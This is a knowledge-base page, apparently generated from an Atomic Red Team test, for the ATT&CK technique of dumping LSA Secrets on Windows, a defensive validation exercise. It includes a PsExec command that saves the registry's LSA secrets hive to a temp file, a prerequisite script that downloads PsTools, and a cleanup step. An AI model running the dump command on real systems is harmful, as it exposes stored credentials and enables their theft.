---
atomic_guid: "55295ab0-a703-433b-9ca4-ae13807de12f"
title: "Dumping LSA Secrets"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.004"
attack_technique_name: "OS Credential Dumping: LSA Secrets"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "55295ab0-a703-433b-9ca4-ae13807de12f"
  - "Dumping LSA Secrets"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Dumping LSA Secrets

Dump secrets key from Windows registry
When successful, the dumped file will be written to $env:Temp\secrets.
Attackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.
https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.

## Metadata

- Atomic GUID: 55295ab0-a703-433b-9ca4-ae13807de12f
- Technique: T1003.004: OS Credential Dumping: LSA Secrets
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1003.004/T1003.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.004]]

## Input Arguments

### psexec_exe

- description: Path to PsExec executable
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\T1003.004\bin\PsExec.exe

## Dependencies

PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})

### Prerequisite Check

```powershell
if (Test-Path "#{psexec_exe}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PSTools.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PSTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PSTools" -Force
New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe" "#{psexec_exe}" -Force
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
"#{psexec_exe}" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
```

### Cleanup

```cmd
del %temp%\secrets >nul 2> nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.yaml)
